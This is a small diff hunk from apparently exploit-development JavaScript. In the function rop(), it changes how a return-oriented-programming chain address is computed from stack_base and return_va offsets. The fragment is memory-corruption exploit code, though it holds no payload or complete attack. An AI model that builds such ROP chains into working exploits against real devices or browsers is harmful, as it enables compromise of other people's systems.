@@ -32,7 +32,7 @@ var checking = false;
 function rop() {
 	setBase(stack_base + return_va);
 	var resp = getU64from(stack_base + return_va);
-	//var chainAddress = stack_base + return_va + 0x420;
+	this.data = stack_base + return_va + 0x420;
 	var chainAddress = stack_base - 0x20000;
 	var chainLength = 0;
 	var variableAddresses = [];
